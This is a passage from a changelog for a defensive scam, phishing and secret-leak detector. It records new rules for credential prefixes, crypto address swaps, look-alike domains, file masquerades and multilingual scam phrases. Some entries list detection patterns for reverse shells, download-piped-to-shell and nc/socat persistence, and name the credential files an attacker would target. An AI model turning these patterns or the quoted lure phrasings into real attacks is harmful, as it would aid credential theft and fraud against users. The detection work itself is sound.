  threshold while still *reporting* every finding ≥ ALERT).
- **Epistemic humility — blind-spot disclosure on clean verdicts**
  (NEW-PERSPECTIVE-BLINDSPOT). Socratic reframing ("the only true wisdom is
  knowing you know nothing"): every other signal enriches a *threat* finding,
  but the most dangerous output is a **false `OK`** — the user proceeds
  *because* the tool blessed it. A clean verdict means "no syntactic deception
  markers found", not "safe". The `url`, `text`, and `email` checks now append a
  one-line `ℹ Blind spot:` note on a clean (score 0) result, stating what HLSE
  cannot see — a pixel-perfect clone on a clean domain, a novel scam with no
  known phrasing, a breached-but-legitimate sender — so an OK is not mistaken
  for proof of safety. Shown only on interactive single checks (not batch/CI/
  scan output) and only on clean results; threat verdicts are unaffected.
- **Blast radius — the pivot/correlation lens** (NEW-PERSPECTIVE-BLAST-RADIUS).
  Socratic reframing: a `scan` reported N findings one at a time, but an
  attacker *chains* them — a leaked AWS key **+** a database URL **+** a GitHub
  token is a full pivot (code → cloud → data), materially worse than ten copies
  of one test key. Danger lives in the *diversity of asset classes*, not the
  count. The scan now buckets each secret finding into a coarse asset class
  (cloud-infrastructure, source-control, database, payment, communications,
  AI-provider, private-key) and, when findings span ≥2 classes, emits a
  `⚠ BLAST RADIUS: … span N asset classes (…) — an attacker can pivot …` summary
  (human) plus `asset_classes` / `blast_radius` JSON fields. A single class
  (even many tokens) does not trigger it — the warning marks genuine
  cross-system exposure, not volume.
- **Confidence as a dimension distinct from severity** (NEW-PERSPECTIVE-CONFIDENCE).
  Socratic reframing: two secret findings can share a score (severity) while
  having opposite epistemic status — a fixed-prefix `AKIA…`/`ghp_…` or a
  structural match (JWT, GCP service-account JSON, private-key marker) is
  *near-certain* (~zero false positives), whereas a generic `VAR=value` env line
  or a high-entropy guess is a *heuristic*. The single score conflated "how bad"
  with "how sure". The `secret` subcommand now reports a separate
  **confidence** — `certain` vs `heuristic` — in the human header
  (`… — confidence: heuristic`) and a `"confidence"` JSON field; a heuristic
  finding additionally prints a "confirm it is a live credential" note. A
  generic `PASSWORD=…` (BLOCK 70, heuristic) and an `AKIA…` (ISOLATE 80,
  certain) now read as different on the confidence axis even though both block.
- **Remediation guidance — from detection to response** (NEW-PERSPECTIVE-REMEDIATION).
  Socratic reframing: a detector answers "is this dangerous?", but the user's
  real question at that moment is "what do I do *now*?". Every verdict explained
  **why** (reasons) yet none said **what next**. For actionable verdicts
  (score ≥ 60) the `clipboard`, `secret`, and `email` subcommands now emit a
  concrete next-action — `→ Action: …` in human output and a `"remediation"`
  field in JSON. Highest-stakes first: a clipboard hijack says "Do NOT send
  funds — re-copy and verify every character"; a leaked credential says
  "revoke/rotate now and purge git history"; a spoofed email says "verify the
  sender on a known channel before acting." Sub-threshold (LOG/ALERT < 60)
  verdicts stay quiet — advice is reserved for when action is genuinely needed.

### Security
- **Network: default-route integrity (N2) was documented but never
  implemented** (GAP-NET-N2). The header advertised an N2 "gateway change"
  check, yet `hlse_check_network()` only did ARP/DNS/hosts. Routing injection —
  malware adding a second default route at the same metric as the real gateway
  to silently MITM all traffic — went undetected. Implemented N2 by parsing
  `/proc/net/route`: when ≥2 default routes share the lowest metric, score +55
  and decode both conflicting gateway IPs into the reason. There is no benign
  reason for a client to carry two same-metric default routes (load balancing
  happens at the router, not the host).
- **Network: DNS allow-list hardening** (N3). Added AdGuard, Neustar/UltraDNS,
  and the canonical IPv6 resolvers (Cloudflare/Google/Quad9) to the known-safe
  list, and tightened the RFC-1918 `172.` test to the real `172.16–172.31`
  range (previously any `172.*` was trusted, including routable space).
- **Network: hosts-file pharming coverage** (N4). Expanded the sensitive-domain
  list from 13 to ~50: added Citi/US Bank/Capital One/PNC, Cash App/Zelle/
  Stripe/Square, Bybit/OKX/KuCoin/Crypto.com/Gate.io, Ledger/Trezor/Exodus/
  Trust Wallet/Phantom, Revolut/Wise/N26/ING, KR banks, and Alipay/WeChat Pay.
- **Secrets: Google OAuth client secret** (GAP-SECRET-GOCSPX). Added the
  `GOCSPX-` prefixed Google OAuth2 client secret to the pattern table (unique
  prefix → ~zero FP) — ISOLATE(90).
- **Secrets: newer LLM-provider keys** (GAP-SECRET-LLM). Added Groq (`gsk_`),
  Perplexity (`pplx-`), and xAI/Grok (`xai-`) API-key prefixes (each requires a
  ≥20-char body, so short prefix-words like `xai-dir` are not flagged). DeepSeek
  (`sk-`) and Cohere were deliberately omitted — their prefixes are too generic
  and would raise the false-positive rate.
- **Secrets: bare Telegram bot tokens** (GAP-SECRET-TELEGRAM). A Telegram bot
  token (`<8-10 digit id>:<35 base64url chars>`) is a recognized
  secret-scanning target (TruffleHog/GitGuardian) but HLSE caught it only when
  it carried a `TELEGRAM_BOT_TOKEN=` env prefix. Added a structural check: a
  colon with an 8–10 digit id before and ≥35 base64url chars after — ISOLATE.
  FP-guarded so timestamps (`12:34:56`), ports (`:8080`), and ratios stay clean.
- **Secrets: AWS credentials-file format missed entirely** (GAP-SECRET-AWSINI).
  The canonical `~/.aws/credentials` form uses lowercase keys with spaces
  around `=` (`aws_secret_access_key = wJal…`), but the env-pattern scan is
  case-sensitive (UPPERCASE only) and rejects any space after `=`, so the most
  common real-world AWS secret-key leak format scored OK(0). The bare 40-char
  base64 secret is too generic to flag alone, but anchored to a
  case-insensitive `aws_secret_access_key` key it is high-confidence: match the
  key with a new `ci_strstr`, skip `=`/quotes/whitespace, require ≥40 base64
  chars, suppress placeholders — ISOLATE on a real key.
  - `aws_secret_access_key = <40-char base64>`: OK(0) → flagged (AWS_SECRET_KEY)
  - FP-guarded: `YOUR_SECRET_KEY_HERE_PLACEHOLDER…` and short values stay clean.
- **File: HTML-smuggling masquerade** (GAP-FILE-HTML). An HTML file wearing a
  document/image extension (`invoice.pdf`, `statement.doc` that is really
  `<!DOCTYPE html>…`) opens in the browser and runs embedded JS / reconstructs
  an in-page payload — a top phishing-delivery vector. HTML has no fixed magic
  byte, so it slipped past the byte-signature table. Added a `looks_like_html()`
  detector (case-insensitive, BOM/whitespace-tolerant, matches
  `<!doctype html`/`<html`/`<head`/`<script`/`<svg`/comment lead-in) and an F2
  rule — ALERT(55). Genuine `.html`/`.htm`/`.svg` files are exempt.
- **Secrets: connection-string embedded credentials** (GAP-SECRET-URICREDS). A
  password inside a service URI (`postgres://user:pass@host`,
  `mongodb+srv://user:pass@host`, redis/amqp/mysql/…) is a high-volume
  real-world leak, but was caught only with a `DATABASE_URL=` env prefix. Added
  a structural check over a fixed set of credential-bearing schemes (so a plain
  `https://` link handled by the URL module does not collide) that extracts the
  `user:password@` userinfo and flags a non-trivial password — ISOLATE(80).
  FP-guarded: host-only URIs, `${VAR}` references, and placeholders stay clean.
- **Clipboard: Tezos mislabel + Polkadot/Algorand coverage** (GAP-CLIP-XTZ-DOT-ALGO).
  A Tezos address (`tz1…`, 36-char base58) was *detected* but mislabeled "SOL
  (Solana)" because it fell into the base58 catch-all; Polkadot (47–48-char
  SS58) and Algorand (58-char base32) were missed entirely. Added explicit
  matchers ahead of the Solana catch-all: Tezos now labels correctly, Polkadot
  and Algorand swaps go OK(0)→ISOLATE(95). Solana detection unregressed.
  (`detect_crypto_type` feeds only the clipboard comparison, never the
  scoring path, so this cannot affect phishing/scam F1.)
- **Clipboard: Bitcoin Cash & Cosmos coverage** (GAP-CLIP-BCH-ATOM). The
  clipper-swap detector recognized 14 address formats but not two major coins:
  Bitcoin Cash (`bitcoincash:q…` CashAddr) and Cosmos Hub (`cosmos1…`). A
  swap on either returned OK — the exact silent failure the module exists to
  prevent. Added both with prefix-anchored, zero-FP matchers; cross-type
  copy/paste mismatches are flagged distinctly. ISOLATE(95) on same-type swap.
- **Secrets: JWT bearer tokens** (GAP-SECRET-JWT). A leaked signed JWT
  (`eyJ….eyJ….<sig>`) is a live bearer credential that GitHub/GitGuardian both
  flag, but HLSE returned OK(0). Added detection keyed on the JWT-specific
  shape: the `eyJ` prefix (base64 of `{"`, which every JWT header begins with)
  plus three base64url segments separated by single dots, with minimum segment
  lengths (header≥10, payload≥10, signature≥20) so unsigned 2-segment tokens
  and stray `eyJ…` base64 fragments do not false-positive — BLOCK(60).
- **Secrets: Azure storage AccountKey** (GAP-SECRET-AZURE). A raw Azure
  connection string (`...;AccountKey=<88-char base64>;...`) returned OK unless
  it happened to carry the `AZURE_STORAGE_CONNECTION_STRING=` env prefix. Added
  a structural check that flags an `AccountKey=` followed by ≥40 base64 chars
  (real keys are 88), with placeholder suppression — ISOLATE(85).
- **Audit: system-cron persistence blind spot** (GAP-AUDIT-CRON). A4 scanned
  user crontabs and `/etc/cron.d/` but ignored `/etc/cron.{hourly,daily,weekly,
  monthly}/` and `/etc/crontab` itself — all classic persistence locations.
  Now scans every system cron directory plus the system crontab for the same
  reverse-shell / download-pipe / base64 patterns.
- **Audit: system-wide shell-init backdoor** (GAP-AUDIT-PROFILED). A6 inspected
  the calling user's `~/.bashrc`-family files but not `/etc/profile.d/`, which
  executes for *every* interactive login. Added a scan of `/etc/profile.d/` for
  reverse-shell device paths, download-piped-to-shell, and nc/socat — scored at
  CRITICAL (+50/+55) because the blast radius is all users, not one.

- **URL: obfuscated dotless-IP hosts** (GAP-URL-IPOBF). The IP-host check
  required a `.` in the host, so the classic blocklist-evasion forms — hex
  (`http://0x7f000001/`) and dword-decimal (`http://2130706433/`), both
  decoding to a real IP — fell through to the generic "digit-heavy" heuristic
  at LOG(30). A host with no dot that is all-digits (≥7) or `0x`-hex is never a
  registrable domain (no all-numeric TLD exists), so it is flagged at +40 as a
  named obfuscation signal with effectively zero false positives.
  - `http://0x7f000001/admin`: LOG(30) → BLOCK(70)
  - `http://2130706433/login`: → ISOLATE(85)
  - FP-guarded: `7-eleven.com`, dotted IPs, and `host:port` are unaffected.

### Fixed
- **Clipboard: address-swap missed when an address carried surrounding
  whitespace** (BUG-CLIP-WS). A real clipboard selection routinely includes
  leading/trailing spaces or a trailing newline; an untrimmed address failed
  fixed-length/prefix format detection, so the clipper swap was silently missed
  (`"  1A1z…Divf  "` vs a different BTC address → OK). `hlse_check_crypto_swap`
  now trims both inputs before detection; identical addresses differing only in
  surrounding whitespace are correctly NOT flagged as a swap.
- **Email: folded (RFC 5322 continuation) headers broke From parsing**
  (BUG-EMAIL-FOLD). A spoofed header split across lines —
  `From: PayPal Support\n <service@evil.ru>` — left the address on the folded
  line, so `extract_domain` stopped at the newline (missing `evil.ru`) and the
  display name kept an embedded newline. The spoof scored a weak ALERT(45) with
  a malformed reason instead of BLOCK(65). Added an RFC 5322 §2.2.3 unfolding
  pass (CRLF+WSP → single space) before parsing; legitimate folded headers and
  brand-owns-domain suppression are unaffected.
- **Scan: files ≥1 MB were skipped entirely for secrets** (BUG-SCAN-SIZECAP). A
  log, `.sql` dump, or bundled config just over 1 MB — exactly the files where
  credentials hide — was counted as "scanned" but its contents were never read,
  a misleading silent false-negative. Replaced the hard 1 MB skip with an 8 MB
  per-file byte budget: large files are now scanned (bounded so a pathological
  huge file can't stall the run; a 10 MB file completes in ~0.3 s).
- **Secrets: real keys silently suppressed by far-off "example"/"sample" prose**
  (BUG-SECRET-PLACEHOLDER-WINDOW). The placeholder/example detector scanned 64
  chars of context before a matched secret for marker words — so a live key was
  dropped whenever unrelated prose nearby contained "example", "sample", or a
  run of `xxxxxxxx` (e.g. `Example config for production: AKIA<real key>`,
  common in READMEs, logs, and config comments). Tightened the context window to
  32 chars (a marker must abut the secret as an assignment prefix like
  `example_key =`) and excluded the repetitive-char markers from the context
  scan (an x-filled *token* is still caught by the token-self and distinct-char
  checks). Genuine placeholders (`example_api_key = …`, the AWS doc key,
  `your_api_key_here`) remain suppressed; real keys in prose are now detected.
- **Scan: `.env` and other dotfiles were silently skipped** (BUG-SCAN-DOTFILES).
  The recursive directory scanner skipped every entry whose name began with
  `.`, intending to skip `.`/`..`/`.git` — but this also skipped `.env`,
  `.npmrc`, `.pypirc`, `.git-credentials`, `.aws/credentials`, the *highest*-value
  secret-bearing files. A `scan <repo>` in CI would report clean while a leaked
  `.env` sat right there. Now only `.`/`..` are skipped at the entry level, and
  dot-named **directories** (`.git`, `.svn`, `.hg`) are filtered via the
  existing `SKIP_DIRS` list, so dotfiles are scanned but VCS metadata trees are
  not. (`.env` with embedded DB credentials: silently OK → ISOLATE.)
- **URL: `@`-credential-trick false positive on `@` in query string**
  (FP-URL-ATSIGN). The check searched the *entire* URL after the scheme for an
  `@`, so a benign link with an email in a query parameter
  (`https://example.com/contact?email=user@gmail.com`) was flagged ALERT(45) as
  a credential trick — and the reason fired twice on open-redirect URLs. Bounded
  the search to the authority component (between `://` and the first `/`,`?`,`#`).
  Real `host@evil.ru` tricks still ISOLATE; email-in-query URLs are now clean.

### Changed
- **Email: false positive on legitimate banks** (FP-EMAIL-BANK). The E1
  display-name check listed `"bank"` as an impersonation keyword but
  `brand_owns_domain()` had no bank entries, so `From: Chase Bank
  <noreply@chase.com>` was flagged BLOCK(65) as impersonation. Added canonical
  domains for major US/JP/EU/KR banks (chase.com, bankofamerica.com, smbc.co.jp,
  ing.com, kbstar.com, …) so a bank's own domain is recognized; look-alike
  domains (`chase-secure.ru`) still fire.
- **Email: missing-authentication signal** (E4). Added detection for
  `spf=none ∧ dkim=none ∧ dmarc=none` in Authentication-Results — a sender
  publishing *no* email-auth records is itself a weak spoofing signal
  (+20), distinct from the existing explicit `=fail` checks.
- **Text: Spanish / Portuguese / Arabic scam coverage** (GAP-TEXT-ROMANCE-AR).
  The wordlists covered EN + CJK but returned OK(0) for the entire Spanish,
  Portuguese, and Arabic threat surface. Added fused, scam-defining phrasings
  (not bare keywords, per dual-use discipline) across five categories:
  account-credential asks (`verificar su identidad`, `verificar sua
  identidade`, `تحقق من هويتك`), consequence-threat alerts (`cuenta ha sido
  suspendida`, `para evitar a suspensão`, `سيتم إغلاق حسابك`), prize lures
  (`ha sido seleccionado`, `ganhou um prêmio`, `ربحت جائزة`), rental-scam
  key-mailing (`le enviaremos las llaves por correo` + `depósito … por
  transferencia bancaria`), and money-movement (`enviar dinero`, `transferir
  dinheiro`). Verified no double-scoring (suspension phrases live only in
  FAKE_ALERT_WORDS) and no FP on benign ES/PT prose.

## [1.0.2] — 2026-06-13

### Security
- **File: shebang script masquerading as a document** (GAP-FILE-SHEBANG): the
  magic-byte mismatch check detected binary executables disguised as images
  (PE-as-`.jpg`), but a text script with a `#!` shebang returned NULL magic, so
  `invoice.pdf` / `photo.jpg` / `report.mp4` that were really runnable shell /
  python / perl scripts passed as OK. Added a `Script` magic (`#!`) and an F2
  rule that flags a shebang file wearing a passive document/image/media
  extension. Enriched `DOCUMENT_EXTS` with media containers (`.mp3`, `.mp4`,
  `.mov`, `.mkv`, `.epub`, …).
  - script-as-`invoice.pdf` / `photo.jpg` / `report.mp4`: OK(0) → BLOCK(60)
  - legitimate `.sh` / `.py` scripts and real `%PDF` files unaffected.
- **Supply-chain: ecosystem-alias false-negative** (BUG-PKG-ECOSYSTEM): the
  package typosquat check filtered registries by an exact string match against
  internal labels (`pip`, `npm`, `cargo`, `go`, `gem`), but the CLI help and
  every user's mental model use registry names like **`pypi`**. Running
  `package reqeusts pypi` matched *zero* registries and returned **OK** — a
  silent false-negative on a security check: the user believes they vetted the
  package and got a clean result, then installs the malware. Added
  `canonical_ecosystem()` aliasing (`pypi`/`python`/`pip3` → pip,
  `node`/`nodejs`/`yarn`/`pnpm` → npm, `crates`/`crates.io`/`rust` → cargo,
  `golang` → go, `rubygems`/`ruby`/`bundler` → gem). An **unrecognized**
  ecosystem now scans *all* registries (fail safe) instead of matching nothing.
  - `package reqeusts pypi`: OK(0) → BLOCK(70) ("1 edit from 'requests'")
  - `package numpyy python`, `package djngo pip`, `package raisl rubygems`: now
    correctly BLOCK; `package reqeusts <unknown>` fails safe to BLOCK.
- **Text: CJK account-credential phishing** (GAP-TEXT-CJK): the Japanese /
  Korean / Chinese wordlists covered the emotional/authority scams (ore-ore
  fraud, tax-authority impersonation) but had **no account-credential phishing
  vocabulary** — so the highest-volume global attack class (bank / e-commerce
  "your account was accessed, verify now") scored OK(0) in those languages while
  the identical English lure scored ALERT/BLOCK. Added account-alert phrasings to
  FAKE_ALERT_WORDS (JP `口座が不正利用`/`アカウントが停止されました`, CN
  `账户异常`/`账户将被冻结`, KR `계정이 정지`/`비정상적인 로그인`) and
  payment/credential-update asks to BAIT_WORDS (JP `支払い情報を更新`/`本人確認を完了`,
  CN `验证身份`/`更新支付信息`, KR `본인 인증`/`결제 정보`).
  - 三井住友銀行「口座が不正利用…至急ご確認」: OK(0) → ALERT(50)
  - アマゾンプライム「自動更新に失敗…支払い情報を更新」: OK(0) → LOG(32)
  - Korean「계정이 일시 정지…본인 인증」: OK(0) → ALERT(42)
  - Chinese「账户存在异常活动…验证身份…账户将被冻结」: OK(0) → BLOCK(77)
  - FP-clean: benign CJK (meeting reminders, order confirmations, in-branch ID
    checks) stay SAFE; legitimate payment-update *confirmations* score the same
    mild LOG(24) as their English equivalents (cross-language parity).
- **Text: prospective consequence-threat phishing** (GAP-TEXT-THREAT): account
  phishing manufactures urgency by threatening a FUTURE loss ("your account will
  be suspended … or lose access to your funds"). The engine detected the urgency
  but never booked the threat as a signal, so textbook lures scored only LOG.
  Added the phishing-specific threat+action phrasings to FAKE_ALERT_WORDS:
  `lose access to your account/funds`, `to avoid suspension`, `verify within 24
  hours`, `verify now to avoid`, `confirm now or`, `will be permanently
  disabled`, etc. The **bare** future verbs (`will be suspended/terminated/
  closed/deactivated`) are intentionally excluded — they are dual-use (SaaS
  trials, HR offboarding, bank-inactivity notices all use them legitimately).
  - `"…Coinbase account will be suspended … or lose access to your funds"`:
    LOG(25) → ALERT(55)
  - `"…PayPal account will be locked permanently unless you verify now to avoid
    suspension"`: → BLOCK(61)
  - FP-clean: legitimate trial/subscription/HR/bank "will be terminated/closed/
    deactivated" notices all stay SAFE.

- **URL: brand-impersonation cascade refactor + product-term fusion**
  (GAP-URL-BRANDFUSION): Reworked the brand-impersonation checks in
  `detect_security_hyphenation()` into a single mutually-exclusive cascade so a
  registrable domain contributes at most one brand reason (no more double-scoring
  of `paypal-verify.net`). Added a dedicated `BRAND_SUFFIX_WORDS` list (`enterprise`,
  `excel`, `outlook`, `drive`, `onedrive`, `sharepoint`, `office`, `workspace`,
  `meet`, `calendar`) that flags impersonation only when a product/edition term is
  **fused to a known brand** — these terms are intentionally kept out of the generic
  hyphenation counter because they are common in legitimate domains.
  - `app.slack-enterprise.com/sign-in`: OK(0) → ALERT(45)
  - `microsoftexcel.com/login`: LOG(15) → ALERT(45)
  - `googledrive.net/login`: LOG(15) → ALERT(45)
  - `teams-enterprise-signin.com`: LOG(20) → ALERT(55)
  - `microsoftoutlook.com/webmail`: → ALERT(45)
  - **FP fixed**: `my-enterprise-blog.com` LOG(20) → OK(0) (enterprise no longer a
    generic security word); `hard-drive-recovery.com` and `paypal-verify.net`
    unchanged from prior behaviour.
- **URL: brand+security-word concatenation** (no hyphen): `googleverify.net`,
  `paypalupdate.com` now flagged via the same cascade.
- **URL: trusted brand as direct subdomain of trusted parent**: `outlook.live.com`,
  `outlook.microsoft.com` no longer mis-flagged as subdomain spoofing (only exempt
  when the registrable parent is itself trusted and there is no extra nesting —
  `paypal.com.google.com` still fires).
- **URL: a brand's own `<brand>.com` is canonical** (GAP-URL-OWNDOMAIN): added
  `is_own_brand_dotcom()` — when the registrable SLD exactly equals a known brand
  and the host ends in `.com`, single phishing-path matches no longer raise the
  score (the trademark holder owns its own `.com`). Scales to every brand without
  a per-brand map; `sld_label()` returns the true registrable SLD so the nested
  decoy `paypal.com.evil.com` (SLD `evil`) is correctly excluded.
  - `www.slack.com/signin`, `www.dropbox.com/login`, `paypal.com/signin`:
    LOG(15) → OK(0)
  - Impostors unaffected: `paypal.xyz/login` LOG(35), `paypal-verify.com/signin`
    BLOCK(70), `g00gle.com/login` BLOCK(65), `paypal.com.evil.com/signin` BLOCK(60).
- **URL: hyphenated login-path variants**: added `/sign-in` and `/log-in` to
  `PATH_PATTERNS` (the existing `/signin`, `/login` did not match the hyphenated
  spellings used by phishing kits).
- **URL: BRANDS additions**: `teams` (Microsoft Teams impersonation).
- **Text: rental-scam "mail you the keys"** (GAP-TEXT-RENTAL): added scam-defining
  phrases (`mail you the keys`, `keys will be mailed`, …) to the rental-fraud group.
  Legitimate landlords never mail keys to an unvetted applicant. Replaces the
  dual-use "currently out of the country" travel-status phrasing that caused FPs.
- **Text: romance fund-transfer** (GAP-TEXT-ROMANCE): verb-anchored
  "…to my account" money-movement phrases added to FIN_ACTION_WORDS (e.g.
  `transfer money to my account`), avoiding FPs on benign "send the report to my
  account team". Celebrity crypto-doubling giveaway phrases added to PRIZE_WORDS.

## [1.0.1] — 2026-06-13

### Security
- **Text: bare-domain URL detection in messages** (GAP-TEXT-BAREDOMAIN): Extended
  `hlse_scan()` to extract bare domains (no `http://`/`https://` scheme) from text
  messages and run full URL analysis on them. Group A (inherently suspicious TLDs:
  `.xyz`, `.top`, `.click`, `.tk`, `.pw`, `.su`, `.vip`, `.icu`) are always scanned.
  Group B (common TLDs: `.com`, `.net`, `.org`, `.io`, etc.) are scanned when the
  domain contains a hyphen (the hallmark of lookalike/typosquat domains).
  - `"netflix.com-billing-update.net/pay"` in text: OK(0) → ISOLATE(93)
  - `"accounts.google-security-check.com"` in text: OK(0) → ALERT(55)
  - `"trustwallet-verify.io/confirm"` in text: LOG(27) → ISOLATE(97)
  - `"paypal-update-verify.com/login"` in text: BLOCK(70) ✓
  - `"microsoft-security-alerts.com"` in text: ISOLATE(85) ✓
  - Legitimate domains (`amazon.com`, `google.com`, `zoom.us`, `wikipedia.org`)
    correctly remain SAFE (no hyphen in common TLDs → not scanned).

## [1.0.0] — 2026-06-13

### Security
- **URL: delivery/fee/duty/tracking added to SECURITY_WORDS** (GAP-URL-DELIVERY):
  Added `duty`, `fee`, `track`, `tracking`, `delivery` to SECURITY_WORDS in
  hlse_core.c. `fedex-duty.com`, `ups-fee.com`, `dhl-tracking.net`, and similar
  delivery-fee phishing domains now correctly trigger brand+security_word compound
  detection. `fedex-delivery.com` improved to ALERT(55).
- **Text: customs/duty delivery smishing** (GAP-TEXT-CUSTOMS): Added `duty fee`,
  `pay duty fee`, `customs charge`, `package held at customs`, `parcel held at
  customs`, `shipment held at customs`, `held by customs` to CALLBACK_PHISH_WORDS.
  Full FedEx duty-fee smishing with URL improved from OK(0) to ISOLATE(95).

### Milestone
- **Version 1.0.0**: Detection coverage now spans all major scam categories:
  advance-fee (419, loan, crypto recovery), BEC (wire fraud, CEO fraud, real-estate),
  callback/TOAD/vishing, delivery smishing, hitman hoax, FBI scareware, pump-and-dump,
  pig-butchering (entry through exit), reshipping mule recruitment, utility cutoff,
  romance stranded-abroad, social-media task scam, SIM swap, OTP relay, QR quishing,
  subscription renewal BazarCall, overpayment fraud, and more.

## [0.9.99] — 2026-06-13

### Security
- **Text: FBI/police scareware & hitman hoax detection** (GAP-TEXT-SCAREWARE):
  Added `fbi warning`, `fbi notice`, `fbi alert`, `failure to comply`,
  `flagged for illegal activity`, `law enforcement has been notified`,
  `dea enforcement`, `narcotics department`, `police warning` to AUTHORITY_WORDS.
  FBI ransomware/scareware improved from OK(0) to BLOCK(67).
- **Text: hitman murder-for-hire hoax detection** (GAP-TEXT-HITMAN): Added
  `hired to kill you`, `been hired to kill`, `contract on your life`,
  `hit has been placed on you`, `assassin has been hired` to EMERGENCY_SCAM_WORDS.
  Hitman hoax with Bitcoin demand improved from LOG(20) to ISOLATE(100).
- **Text: "do not contact police" secrecy pressure** (GAP-TEXT-NOPOLICE): Added
  `do not contact the police`, `do not call the police`, `do not report this`,
  `do not go to the police`, `do not involve the police` to SECRECY_WORDS.
  These phrases appear in hitman hoaxes, grandparent scams, and sextortion.

## [0.9.98] — 2026-06-13

### Security
- **Text: 1-833 and 1-855 toll-free robocall prefixes** (GAP-TEXT-TOLLFREE): Added
  `call 1-833`, `call 1-855`, `call +1-833`, `call +1-855`, `at 1-833-`, `at 1-855-`
  to FAKE_ALERT_WORDS. These 2017-era toll-free prefixes are widely abused in
  tech-support, SSA/Medicare, IRS, and student-loan-forgiveness scam robocalls.
  Student loan forgiveness scam improved from LOG(20) to ALERT(50); SSA suspension
  scam BLOCK(66); Medicare insurance fraud scam ALERT(55).

## [0.9.97] — 2026-06-13

### Security
- **Text: pig-butchering exit scam / withdrawal fee fraud** (GAP-TEXT-PIGOUT): Added
  `withdrawal tax`, `withdrawal fee of`, `withdrawal fee required`, `aml compliance fee`,
  `aml fee`, `anti-money laundering fee`, `tax clearance fee`, `clearance fee to release`,
  `fee to unlock your profits`, `before you can withdraw`, `before withdrawal is possible`
  to GROOMING_WORDS. Pig-butchering fake-withdrawal messages improved from OK(0) to ALERT(40).
- **Text: pig-butchering rapport-building opener** (GAP-TEXT-PIGOPEN): Added `crypto mentor`,
  `investment mentor`, `my mentor showed me`, `let me show you how i made` to GROOMING_WORDS.
  Pig-butchering "my crypto mentor taught me" message improved from OK(0) to ALERT(47).
- **Text: social media "task" / likes scam** (GAP-TEXT-TASKSCAM): Added `liking social
  media posts`, `social media tasks`, `get paid to like`, `like and earn`, `earn by
  liking`, `liking posts for pay`, `earn extra cash from home` to GROOMING_WORDS.
  "Earn $800 a day liking social media posts" improved from LOG(20) to ALERT(40).

## [0.9.96] — 2026-06-13

### Security
- **Text: advance-fee loan fraud detection** (GAP-TEXT-LOAN): Added `regardless of
  credit history`, `regardless of credit score`, and related phrases to GROOMING_WORDS.
  "Congratulations, you are pre-approved... pay a processing fee via CashApp" improved
  from LOG(30) to BLOCK(65). Also added PRIZE+GROOMING amplifier (+15) for the
  advance-fee loan fraud pattern.
- **Text: crypto pump-and-dump detection** (GAP-TEXT-PUMP): Added `about to moon`,
  `huge pump`, `whale accumulation`, `100x potential`, `buy before the pump` and related
  phrases to GROOMING_WORDS. Pump-and-dump messages improved from OK(0) to ALERT(40).
- **Text: utility cutoff scam detection** (GAP-TEXT-UTILITY): Added `electricity will
  be disconnected`, `electricity service will be disconnected`, `power will be cut off`,
  `gas will be shut off`, `service will be disconnected today`, `avoid disconnection` and
  related phrases to EMERGENCY_SCAM_WORDS. Full utility scam message improved from
  LOG(28) to BLOCK(68); minimal form (URGENT + 1-800 + disconnect threat) BLOCK(78).
- **Text: 419/deceased-estate fraud detection** (GAP-TEXT-419): Added `estate of the
  late`, `funds of the late`, `the late mr`, `as the beneficiary of the estate` to
  BAIT_WORDS (previously these were absent, leaving classic 419 messages at LOG(30)).
  Full 419 estate-fraud message now BLOCK(74).
- **Text: romance/travel scam "stranded abroad" variant** (GAP-TEXT-ROMANCE): Added
  `i am stuck in`, `stranded in`, `my wallet was stolen`, `need money to return`,
  `i will repay you`, `please send me money` to EMERGENCY_SCAM_WORDS. Romance scam
  message with Western Union request improved from OK(0) to BLOCK(77).
- **Text: reshipping mule recruitment** (GAP-TEXT-RESHIP): Added `reship to our`,
  `reship to a`, `receive packages at your` to GROOMING_WORDS to catch reshipping scam
  messages where "at your address" separates "receive packages" from "reship". Package
  reshipping job scam improved from OK(0) to ALERT(40).

## [0.9.95] — 2026-06-13

### Security
- **URL: SECURITY_WORDS expanded — cancel, order, service, notification**
  (GAP-URL-SECWORDS): `amazon-order-cancel.com`, `paypal-order-cancel.com`,
  `microsoft-service-desk.com`, `apple-notification-center.com` all now
  correctly ALERT(55) via brand+security-word compound detection. Previously
  these scored OK(0) because none of the new words were in SECURITY_WORDS.
- **URL: FREE_HOSTS expanded — 000webhostapp, wixsite, weebly, godaddysites,
  mystrikingly, sites.google.com** (GAP-URL-FREEHOST): Brand phishing on these
  heavily-abused platforms now correctly ISOLATE(90). `microsoft-login.000webhostapp.com`
  improved from LOG(35) to ISOLATE(90).
- **Text: HMRC/CRA/ATO tax-authority impersonation detection** (GAP-TEXT-TAXAUTH):
  Added `hmrc`, `inland revenue`, `canada revenue agency`, `australian taxation
  office` to AUTHORITY_WORDS; added `tax refund`, `tax rebate`, `unclaimed tax
  refund`, `tax overpayment` to BAIT_WORDS. HMRC smishing now BLOCK(79), CRA
  smishing BLOCK(69), IRS smishing with URL ISOLATE(81).
- **Text: Amazon Prime / subscription renewal BazarCall detection**
  (GAP-TEXT-SUBSCRIB): Added `subscription is up for renewal`, `up for renewal`,
  `renewal has been processed`, `auto-renewed`, `membership renewal` to
  CALLBACK_PHISH_WORDS. Amazon Prime renewal vishing improved from LOG(38)
  to ISOLATE(83).
- **Text: delivery smishing — "attempted delivery" patterns** (GAP-TEXT-DELIVERY):
  Added `we attempted delivery`, `attempted delivery of your`, `delivery attempt
  failed`, `failed delivery attempt`, `we tried to deliver`, `unable to deliver
  your` to CALLBACK_PHISH_WORDS. USPS attempted-delivery smishing now LOG(15)
  instead of OK(0).
- **Text: upfront-fee job fraud / starter kit scam** (GAP-TEXT-JOBSCAM):
  Added `starter kit`, `reimbursed on first paycheck`, `purchase the equipment`,
  `equipment deposit required` and related phrases to GROOMING_WORDS. Fake job
  starter-kit scam with multiple signals now ALERT(40).
- **File: EXECUTABLE_EXTS expanded** (GAP-FILE-EXT2): Added `.one`/`.onetoc2`
  (OneNote embedded-attachment execution, top 2022-2023 vector), `.iso`/`.img`/
  `.vhd`/`.vhdx` (MOTW bypass disk containers), `.ppsm`/`.potm` (macro-enabled
  PowerPoint), `.iqy` (Excel Internet Query remote-execute), `.theme`/`.themepack`
  (ThemeBleed NTLM theft, CVE-2023-38146). Removed duplicate `.wsc` entry.
  F4 macro check extended to `.ppsm` and `.potm`.
- **File: BAIT_WORDS (LURE_WORDS)** — `customs fee` standalone added to
  CALLBACK_PHISH_WORDS for USPS smishing detection without "required" qualifier.
- **Secrets: DigitalOcean PAT, Atlassian API token, 1Password token**
